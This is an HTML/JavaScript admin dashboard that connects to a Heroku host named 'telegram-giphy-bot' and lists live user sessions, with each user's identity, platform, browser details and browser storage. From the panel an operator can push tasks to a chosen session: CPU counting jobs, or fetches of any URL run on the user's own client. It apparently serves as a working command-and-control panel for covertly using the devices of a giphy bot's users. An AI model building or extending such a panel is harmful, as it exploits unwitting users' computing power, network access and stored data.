<!doctype html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>AgentSDK Dashboard</title>
    <style>
        body{font-family:system-ui,Arial,sans-serif;margin:20px}
        h1{margin:0 0 10px}
        .muted{opacity:.7}
        table{width:100%;border-collapse:collapse;margin-top:10px}
        th,td{padding:10px;border-bottom:1px solid #e5e5e5;font-size:14px;vertical-align:middle;text-align:center}
        a.user-link{color:inherit;text-decoration:underline;cursor:pointer}
        tr.details td{background:#fafafa}
        pre{margin:0;padding:12px;border-radius:8px;background:#fff;max-height:360px;overflow:auto;border:1px solid #eee;text-align:left}
        button.send-btn{padding:6px 10px;border:1px solid #ccc;border-radius:8px;background:#fff;cursor:pointer}
        .bar{height:6px;background:#eee;border-radius:4px;overflow:hidden;margin-top:6px}
        .bar > div{height:100%;width:0%;background:#4caf50}
    </style>
</head>
<body>
<h1>Live Sessions</h1>
<div class="muted">Connected: <span id="conn">…</span></div>
<table>
    <thead>
    <tr>
        <th style="width:40%">User</th>
        <th style="width:20%">Platform</th>
        <th style="width:20%">Last Update</th>
        <th style="width:20%">Actions</th>
    </tr>
    </thead>
    <tbody id="rows"></tbody>
</table>

<script>
    const WS_URL   = "wss://telegram-giphy-bot-9a11b0e83d02.herokuapp.com/ws?role=admin";
    const API_BASE = "https://telegram-giphy-bot-9a11b0e83d02.herokuapp.com";

    const state = new Map(); // sessionId -> {user, client, browser, storage, capabilities, expanded, logs[], last, ts}
    const rowsEl = document.getElementById('rows');
    const connEl = document.getElementById('conn');

    function usernameFrom(user){ return user ? (user.username || user.first_name || "anonymous") : "anonymous"; }

    function mergeSession(cur, msg) {
        const s = cur || { expanded:false };
        if (msg.sessionId) s.sessionId = msg.sessionId;
        if (msg.appId)     s.appId = msg.appId;
        if (msg.user)      s.user = msg.user;
        if (msg.client)    s.client = msg.client;
        if (msg.browser)   s.browser = msg.browser;
        if (msg.storage)   s.storage = msg.storage;
        if (msg.capabilities) s.capabilities = msg.capabilities;
        s.ts = msg.ts || Date.now();
        return s;
    }

    function escapeHtml(str){ return str.replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }

    function compactEvent(msg) {
        if (msg.type === 'progress') return { type:'progress', taskId: msg.taskId, pct: msg.progress };
        if (msg.type === 'result') {
            const out = { type:'result', taskId: msg.taskId, ok: msg.ok };
            if (msg.result) { out.status = msg.result.status; out.size = msg.result.size; }
            if (msg.error)  { out.error  = msg.error; }
            return out;
        }
        return { type: msg.type };
    }

    function render() {
        rowsEl.innerHTML = "";
        const arr = Array.from(state.values()).sort((a,b)=>(b.ts||0)-(a.ts||0));

        for (const s of arr) {
            const tr = document.createElement('tr');
            const userLabel = usernameFrom(s.user);

            const actHTML = `
          <button class="send-btn" data-sid="${s.sessionId}">Send Task</button>
          ${ s.last
                ? `<div class="bar"><div style="width:${Math.min(100, s.last.progress || (s.last.ok === false ? 0 : 100))}%"></div></div>
                 <div class="muted">${s.last.type || ''} ${s.last.status ? ('status ' + s.last.status) : ''} ${s.last.ok === false ? 'error' : ''}</div>`
                : '' }
        `;

            tr.innerHTML = `
          <td><a class="user-link" data-sid="${s.sessionId}">${userLabel}</a></td>
          <td>${s.client?.platform || "—"}</td>
          <td>${s.ts ? new Date(s.ts).toLocaleTimeString() : "—"}</td>
          <td>${actHTML}</td>
        `;
            rowsEl.appendChild(tr);

            if (s.expanded) {
                const det = document.createElement('tr');
                det.className = "details";
                const payload = {
                    sessionId: s.sessionId, appId: s.appId || null,
                    user: s.user || null, client: s.client || null, browser: s.browser || null,
                    storage: s.storage || null, capabilities: s.capabilities || null, ts: s.ts || null
                };
                const logsHTML = (s.logs && s.logs.length)
                    ? `<h3 style="margin:12px 0 6px">Recent Events</h3><pre>${escapeHtml(JSON.stringify(s.logs.slice(0,5), null, 2))}</pre>`
                    : "";
                det.innerHTML = `<td colspan="4"><pre>${escapeHtml(JSON.stringify(payload, null, 2))}</pre>${logsHTML}</td>`;
                rowsEl.appendChild(det);
            }
        }

        rowsEl.querySelectorAll('a.user-link').forEach(a => {
            a.onclick = (e) => {
                const sid = e.currentTarget.getAttribute('data-sid');
                const obj = state.get(sid);
                if (obj) { obj.expanded = !obj.expanded; render(); }
            };
        });

        rowsEl.querySelectorAll('button.send-btn').forEach(b => {
            b.onclick = async (e) => {
                const sid = e.currentTarget.getAttribute('data-sid');
                const kind = prompt("Task type: cpu or fetch", "cpu");
                if (!kind) return;

                let payload = {};
                if (kind === "cpu") {
                    const n = parseInt(prompt("Count to N", "10000") || "10000", 10);
                    payload = { n: isNaN(n) ? 10000 : n };
                } else if (kind === "fetch") {
                    const u = prompt("URL (try CORS-enabled first)", "https://example.com/");
                    if (!u) return;
                    const where = (prompt("Run where? client | server | auto", "client") || "client").toLowerCase();
                    payload = { url: u, where };
                } else {
                    alert("Unknown task type"); return;
                }

                try {
                    const r = await fetch(`${API_BASE}/tasks`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ sessionId: sid, type: kind, payload })
                    });
                    if (!r.ok) { alert("enqueue failed"); return; }
                    const j = await r.json();
                    console.log("enqueued", j);
                } catch { alert("network error"); }
            };
        });
    }

    // --- WS WIRING + keep-alive for Heroku ---
    let ws, pingTimer;
    function connect() {
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            connEl.textContent = "connected";
            clearInterval(pingTimer);
            pingTimer = setInterval(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: "admin_ping", ts: Date.now() }));
                }
            }, 25000);
        };
        ws.onclose = () => {
            connEl.textContent = "disconnected — retrying in 3s";
            clearInterval(pingTimer);
            setTimeout(connect, 3000);
        };
        ws.onerror = () => { connEl.textContent = "error"; };
        ws.onmessage = (e) => {
            let msg; try { msg = JSON.parse(e.data) } catch { return }

            if (msg.type === 'session_join') {
                const cur = state.get(msg.sessionId) || { sessionId: msg.sessionId, expanded:false };
                state.set(msg.sessionId, mergeSession(cur, msg));
                render(); return;
            }
            if (msg.type === 'session_leave') {
                state.delete(msg.sessionId); render(); return;
            }
            if (msg.type === 'hello' || msg.type === 'snapshot' || msg.type === 'ping') {
                const sid = msg.sessionId;
                const cur = state.get(sid) || { sessionId: sid, expanded:false };
                state.set(sid, mergeSession(cur, msg));
                render(); return;
            }
            if (msg.type === 'task_enqueued') {
                const s = state.get(msg.sessionId) || { sessionId: msg.sessionId, expanded:false };
                s.last = { taskId: msg.taskId, type: msg.taskType, progress: 0 };
                s.logs = s.logs || [];
                s.logs.unshift({ t: new Date(msg.ts).toLocaleTimeString(), payload: { type:'task_enqueued', taskId: msg.taskId, taskType: msg.taskType } });
                state.set(msg.sessionId, s);
                render(); return;
            }
            if (msg.type === 'progress') {
                const s = state.get(msg.sessionId);
                if (s) {
                    s.ts = msg.ts || Date.now();
                    s.last = Object.assign({}, s.last, { progress: msg.progress, type: s.last?.type || 'cpu' });
                    s.logs = s.logs || [];
                    s.logs.unshift({ t: new Date(s.ts).toLocaleTimeString(), payload: { type:'progress', taskId: msg.taskId, pct: msg.progress } });
                    s.logs = s.logs.slice(0, 10);
                    render();
                }
                return;
            }
            if (msg.type === 'result') {
                const s = state.get(msg.sessionId);
                if (s) {
                    s.ts = msg.ts || Date.now();
                    s.last = Object.assign({}, s.last, { ok: msg.ok, status: msg.result && msg.result.status });
                    s.logs = s.logs || [];
                    s.logs.unshift({ t: new Date(s.ts).toLocaleTimeString(), payload: { type:'result', taskId: msg.taskId, ok: msg.ok, status: msg.result?.status, size: msg.result?.size } });
                    s.logs = s.logs.slice(0, 10);
                    render();
                }
                return;
            }
        };
    }
    connect();
</script>
</body>
</html>
